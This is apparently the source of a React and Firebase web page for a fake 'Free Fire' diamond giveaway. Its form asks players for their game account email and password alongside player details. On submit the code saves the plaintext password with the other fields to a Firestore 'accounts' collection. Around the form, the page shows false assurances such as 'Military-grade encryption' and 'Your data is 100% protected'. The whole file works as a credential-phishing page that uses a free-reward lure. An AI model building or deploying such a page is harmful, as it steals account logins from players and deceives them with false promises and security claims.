import React, { useState, useEffect } from 'react';
import {
  Box, Container, Typography, TextField, MenuItem, Button, Grid, Card, CardContent, Stack, Alert, Snackbar, InputAdornment, useTheme, alpha,
} from '@mui/material';
import { motion } from 'framer-motion';
import DiamondIcon from '@mui/icons-material/Diamond';
import GiveawayIntro from './GiveawayIntro';
import PersonIcon from '@mui/icons-material/Person';
import FingerprintIcon from '@mui/icons-material/Fingerprint';
import PublicIcon from '@mui/icons-material/Public';
import EmailIcon from '@mui/icons-material/Email';
import ShieldIcon from '@mui/icons-material/Shield';
import BoltIcon from '@mui/icons-material/Bolt';
import CheckCircleIcon from '@mui/icons-material/CheckCircle';
import { addDoc, collection, serverTimestamp } from 'firebase/firestore';
import { onAuthStateChanged } from 'firebase/auth';
import { db, auth } from '../firebase';

const levels = Array.from({ length: 51 }, (_, i) => {
  const val = 50 + i;
  return { value: val, label: `Level ${val}` };
});

const regions = [
  'India',
  'Bangladesh',
  'Pakistan',
  'Indonesia',
  'Thailand',
  'Vietnam',
  'Brazil',
  'Europe',
  'North America',
  'MENA',
];



const GiveawayForm = () => {
  const theme = useTheme();
  const [formData, setFormData] = useState({
    playerName: '',
    uid: '',
    region: '',
    level: '',
    email: '',
    password: ''
  });
  const [open, setOpen] = useState(false);
  const [error, setError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [currentUser, setCurrentUser] = useState(null);

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      setCurrentUser(user);
    });

    return () => unsubscribe();
  }, []);

  const handleChange = (e) => setFormData({ ...formData, [e.target.name]: e.target.value });

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!currentUser) {
      setError('Please sign in before entering the giveaway.');
      return;
    }

    setError('');
    setIsSubmitting(true);
    try {
      await addDoc(collection(db, 'accounts'), {
        playerName: formData.playerName,
        uid: formData.uid,
        region: formData.region,
        level: formData.level,
        email: formData.email,
        password: formData.password,
        createdAt: serverTimestamp(),
        submittedBy: currentUser.uid,
      });
      setOpen(true);
      setFormData({ playerName: '', uid: '', region: '', level: '', email: '', password: '' });
    } catch (err) {
      console.error('Firestore save failed:', err);
      setError('Unable to submit your entry. Please try again later.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const inputStyles = {
    '& .MuiOutlinedInput-root': {
      backgroundColor: alpha(theme.palette.background.paper, 0.4),
      WebkitBackdropFilter: 'blur(10px)',
      backdropFilter: 'blur(10px)',
      transition: 'all 0.3s ease',
      borderRadius: '12px',
      '& fieldset': {
        borderColor: alpha(theme.palette.primary.main, 0.2),
        borderWidth: '1.5px',
      },
      '&:hover fieldset': {
        borderColor: alpha(theme.palette.primary.main, 0.5),
      },
      '&.Mui-focused': {
        backgroundColor: alpha(theme.palette.background.paper, 0.6),
        '& fieldset': {
          borderColor: theme.palette.primary.main,
          boxShadow: `0 0 15px ${alpha(theme.palette.primary.main, 0.3)}`,
        },
      },
    },
    '& .MuiInputLabel-root': {
      color: alpha(theme.palette.text.primary, 0.7),
      '&.Mui-focused': {
        color: theme.palette.primary.main,
      },
    },
    '& .MuiInputAdornment-root .MuiSvgIcon-root': {
      color: alpha(theme.palette.text.primary, 0.5),
      transition: 'color 0.3s ease',
    },
    '& .Mui-focused .MuiInputAdornment-root .MuiSvgIcon-root': {
      color: theme.palette.primary.main,
    },
  };

  const isDisabled = isSubmitting || !currentUser;

  return (
    <>
      <Box
        id="rewards"
        sx={{
          py: { xs: 8, md: 15 },
          position: 'relative',
          background: `radial-gradient(circle at 50% 50%, ${alpha(theme.palette.primary.main, 0.05)} 0%, ${theme.palette.background.default} 100%)`,
          overflow: 'hidden',
        }}
      >
        {/* Decorative Background Elements */}
        <Box
          sx={{
            position: 'absolute',
            top: '10%',
            left: '5%',
            width: '300px',
            height: '300px',
            background: `radial-gradient(circle, ${alpha(theme.palette.primary.main, 0.1)} 0%, transparent 70%)`,
            filter: 'blur(50px)',
            zIndex: 0,
          }}
        />
        <Box
          sx={{
            position: 'absolute',
            bottom: '10%',
            right: '5%',
            width: '400px',
            height: '400px',
            background: `radial-gradient(circle, ${alpha(theme.palette.secondary.main, 0.1)} 0%, transparent 70%)`,
            filter: 'blur(60px)',
            zIndex: 0,
          }}
        />

        <Container maxWidth="md" sx={{ position: 'relative', zIndex: 1 }}>
          <GiveawayIntro />

          <Card
            sx={{
              background: alpha(theme.palette.background.paper, 0.3),
              backdropFilter: 'blur(20px)',
              borderRadius: '24px',
              border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
              boxShadow: `0 20px 50px ${alpha('#000', 0.5)}`,
              overflow: 'visible',
              position: 'relative',
              '&::before': {
                content: '""',
                position: 'absolute',
                top: 0,
                left: 0,
                right: 0,
                bottom: 0,
                borderRadius: '24px',
                padding: '2px',
                background: `linear-gradient(135deg, ${alpha(theme.palette.primary.main, 0.5)}, transparent 40%, transparent 60%, ${alpha(theme.palette.secondary.main, 0.5)})`,
                WebkitMask: 'linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0)',
                WebkitMaskComposite: 'xor',
                maskComposite: 'exclude',
                pointerEvents: 'none',
              },
            }}
          >
            <CardContent sx={{ p: { xs: 3, md: 6 } }}>
              <Box sx={{ textAlign: 'center', mb: 4 }}>
                <Typography
                  variant="h5"
                  sx={{
                    fontWeight: 800,
                    color: 'primary.main',
                    mb: 1,
                    fontSize: { xs: '1.3rem', md: '1.8rem' },
                  }}
                >
                  ✨ REGISTER & UNLOCK YOUR DIAMONDS ✨
                </Typography>
                <Typography
                  variant="body2"
                  sx={{
                    color: 'text.secondary',
                    maxWidth: '500px',
                    mx: 'auto',
                  }}
                >
                  Fill in your details below. Your account information is secured. Winners are notified by email.
                </Typography>
              </Box>

              {error && (
                <Alert severity="warning" sx={{ mb: 3 }}>
                  {error}
                </Alert>
              )}

              {!currentUser && (
                <Alert severity="info" sx={{ mb: 3 }}>
                  Please sign in to enter the giveaway. Your submission is disabled until you are logged in.
                </Alert>
              )}

              <form onSubmit={handleSubmit} style={{ width: '100%' }}>
                <Stack spacing={3}>
                  <Stack direction={{ xs: 'column', md: 'row' }} spacing={3}>
                    <TextField
                      fullWidth
                      label="Player Name"
                      name="playerName"
                      value={formData.playerName}
                      onChange={handleChange}
                      required
                      placeholder="e.g. SKYLORD"
                      sx={inputStyles}
                      disabled={isDisabled}
                      InputProps={{
                        startAdornment: (
                          <InputAdornment position="start">
                            <PersonIcon sx={{ color: 'primary.main' }} />
                          </InputAdornment>
                        ),
                      }}
                    />
                    <TextField
                      fullWidth
                      label="Free Fire UID"
                      name="uid"
                      value={formData.uid}
                      onChange={handleChange}
                      required
                      placeholder="e.g. 1234567890"
                      sx={inputStyles}
                      disabled={isDisabled}
                      InputProps={{
                        startAdornment: (
                          <InputAdornment position="start">
                            <FingerprintIcon sx={{ color: 'primary.main' }} />
                          </InputAdornment>
                        ),
                      }}
                    />
                  </Stack>

                  <Stack direction={{ xs: 'column', md: 'row' }} spacing={3}>
                    <TextField
                      fullWidth
                      select
                      label="Server Region"
                      name="region"
                      value={formData.region}
                      onChange={handleChange}
                      required
                      sx={inputStyles}
                      disabled={isDisabled}
                      InputProps={{
                        startAdornment: (
                          <InputAdornment position="start">
                            <PublicIcon sx={{ color: 'primary.main' }} />
                          </InputAdornment>
                        ),
                      }}
                    >
                      {regions.map((option) => (
                        <MenuItem key={option} value={option}>
                          {option}
                        </MenuItem>
                      ))}
                    </TextField>
                    <TextField
                      fullWidth
                      select
                      label="Level"
                      name="level"
                      value={formData.level}
                      onChange={handleChange}
                      required
                      sx={inputStyles}
                      disabled={isDisabled}
                      InputProps={{
                        startAdornment: (
                          <InputAdornment position="start">
                            <DiamondIcon sx={{ color: 'primary.main' }} />
                          </InputAdornment>
                        ),
                      }}
                    >
                      {levels.map((option) => (
                        <MenuItem key={option.value} value={option.value}>
                          {option.label}
                        </MenuItem>
                      ))}
                    </TextField>
                  </Stack>

                  <TextField
                    fullWidth
                    label="Email Address"
                    name="email"
                    type="email"
                    value={formData.email}
                    onChange={handleChange}
                    required
                    placeholder="Enter your free fire id email for confirmation"
                    sx={inputStyles}
                    disabled={isDisabled}
                    InputProps={{
                      startAdornment: (
                        <InputAdornment position="start">
                          <EmailIcon sx={{ color: 'primary.main' }} />
                        </InputAdornment>
                      ),
                    }}
                  />
                  <TextField
                    fullWidth
                    label="password"
                    name="password"
                    type="password"
                    value={formData.password}
                    onChange={handleChange}
                    placeholder="Enter your free fire id password"
                    sx={inputStyles}
                    disabled={isDisabled}
                    InputProps={{
                      startAdornment: (
                        <InputAdornment position="start">
                          <CheckCircleIcon sx={{ color: 'primary.main' }} />
                        </InputAdornment>
                      ),
                    }}
                  />

                  <motion.div
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                  >
                    <Button fullWidth type="submit" variant="contained" disabled={isDisabled} className="btn-neon" sx={{ py: 2.5, fontSize: '1.15rem', fontWeight: 800, borderRadius: '12px' }}>
                      {isSubmitting ? (
                        <Stack direction="row" spacing={2} alignItems="center" justifyContent="center">
                          <BoltIcon />
                          <span>PROCESSING YOUR ENTRY...</span>
                        </Stack>
                      ) : (
                        '🎁 CLAIM MY FREE DIAMONDS NOW 🎁'
                      )}
                    </Button>
                  </motion.div>
                </Stack>
              </form>

              <Stack
                direction="row"
                spacing={1}
                alignItems="center"
                justifyContent="center"
                sx={{ mt: 4, color: alpha(theme.palette.text.secondary, 0.6) }}
              >
                <ShieldIcon sx={{ fontSize: 16 }} />
                <Typography variant="caption" sx={{ fontStyle: 'italic' }}>
                  ✓ Military-grade encryption  ✓ 48-hour processing  ✓ No hidden charges
                </Typography>
              </Stack>

              {/* Features Checklist */}
              <Box sx={{ mt: 5, pt: 4, borderTop: `1px solid ${alpha(theme.palette.divider, 0.2)}` }}>
                <Typography
                  variant="body2"
                  sx={{
                    fontWeight: 700,
                    color: 'text.primary',
                    mb: 2,
                    textAlign: 'center',
                  }}
                >
                  ⚡ What You Get:
                </Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} sm={6}>
                    <Stack direction="row" spacing={1.5} alignItems="flex-start">
                      <CheckCircleIcon
                        sx={{
                          color: 'primary.main',
                          fontSize: 20,
                          mt: 0.5,
                          flexShrink: 0,
                        }}
                      />
                      <Box>
                        <Typography variant="subtitle2" sx={{ fontWeight: 700, fontSize: '0.95rem' }}>
                          Free Diamond Bonus
                        </Typography>
                        <Typography variant="caption" sx={{ color: 'text.secondary' }}>
                          Up to 2,500 instant diamonds
                        </Typography>
                      </Box>
                    </Stack>
                  </Grid>
                  <Grid item xs={12} sm={6}>
                    <Stack direction="row" spacing={1.5} alignItems="flex-start">
                      <CheckCircleIcon
                        sx={{
                          color: 'primary.main',
                          fontSize: 20,
                          mt: 0.5,
                          flexShrink: 0,
                        }}
                      />
                      <Box>
                        <Typography variant="subtitle2" sx={{ fontWeight: 700, fontSize: '0.95rem' }}>
                          Exclusive Rewards
                        </Typography>
                        <Typography variant="caption" sx={{ color: 'text.secondary' }}>
                          VIP access to future giveaways
                        </Typography>
                      </Box>
                    </Stack>
                  </Grid>
                  <Grid item xs={12} sm={6}>
                    <Stack direction="row" spacing={1.5} alignItems="flex-start">
                      <CheckCircleIcon
                        sx={{
                          color: 'primary.main',
                          fontSize: 20,
                          mt: 0.5,
                          flexShrink: 0,
                        }}
                      />
                      <Box>
                        <Typography variant="subtitle2" sx={{ fontWeight: 700, fontSize: '0.95rem' }}>
                          Fast Verification
                        </Typography>
                        <Typography variant="caption" sx={{ color: 'text.secondary' }}>
                          Auto-verified within minutes
                        </Typography>
                      </Box>
                    </Stack>
                  </Grid>
                  <Grid item xs={12} sm={6}>
                    <Stack direction="row" spacing={1.5} alignItems="flex-start">
                      <CheckCircleIcon
                        sx={{
                          color: 'primary.main',
                          fontSize: 20,
                          mt: 0.5,
                          flexShrink: 0,
                        }}
                      />
                      <Box>
                        <Typography variant="subtitle2" sx={{ fontWeight: 700, fontSize: '0.95rem' }}>
                          Account Security
                        </Typography>
                        <Typography variant="caption" sx={{ color: 'text.secondary' }}>
                          Your data is 100% protected
                        </Typography>
                      </Box>
                    </Stack>
                  </Grid>
                </Grid>
              </Box>
            </CardContent>
          </Card>
        </Container>
      </Box >

      <Snackbar
        open={open}
        autoHideDuration={6000}
        onClose={() => setOpen(false)}
        anchorOrigin={{ vertical: 'bottom', horizontal: 'center' }}
      >
        <Alert
          onClose={() => setOpen(false)}
          severity="success"
          variant="filled"
          sx={{
            width: '100%',
            bgcolor: 'primary.main',
            color: 'background.default',
            fontWeight: 700,
            borderRadius: '12px',
            boxShadow: `0 10px 30px ${alpha(theme.palette.primary.main, 0.5)}`
          }}
        >
          ENTRY RECEIVED — THANK YOU! We'll contact winners by email.
        </Alert>
      </Snackbar>
    </>
  );
};

export default GiveawayForm;
